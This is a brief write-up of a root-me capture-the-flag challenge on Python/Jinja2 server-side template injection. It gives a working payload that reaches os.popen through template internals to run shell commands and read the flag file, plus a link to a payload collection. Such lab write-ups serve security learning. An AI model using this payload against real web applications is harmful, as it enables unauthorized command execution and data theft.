# Python: Server-side Template Injection Introduction

[root-me challenge: Python - Server-side Template Injection Introduction](https://www.root-me.org/fr/Challenges/Web-Serveur/Python-Server-side-Template-Injection-Introduction): This service allows you to generate a web page. Use it to read the flag!

----

`${ ... }` didn't work, but `{{ ... }}` did. Further fiddling. Apparently Jinja2.

Use `{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}` to `cat .passwd`.

## Resources

* [PayloadAllTheThings: Exploit the SSTI by calling os.popen().read()](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread)

